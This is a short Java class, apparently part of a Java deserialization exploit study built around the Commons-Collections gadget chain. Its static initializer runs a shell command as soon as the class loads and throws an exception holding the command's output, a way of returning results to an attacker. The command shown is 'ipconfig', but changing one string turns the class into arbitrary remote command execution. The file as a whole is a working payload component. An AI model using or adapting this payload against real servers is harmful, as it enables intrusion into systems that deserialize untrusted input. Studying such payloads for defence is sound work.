package com.xyh.collections3.no2;

import java.io.BufferedInputStream;

/**
 * 利用加载时自动执行
 *
 * Created by xuanyonghao on 2018/5/5.
 */
public class CallbackRuntime2 {
    public static String exec(String cmd) {
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
            StringBuilder stringBuilder = new StringBuilder();
            byte[] bytes = new byte[4096];
            int len = 0;
            while ((len = bufferedInputStream.read(bytes)) != -1)
                stringBuilder.append(new String(bytes));
            bufferedInputStream.close();
            return stringBuilder.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
    static {
        if (true) {
            throw new RuntimeException(exec("ipconfig"));
        }
    }
}
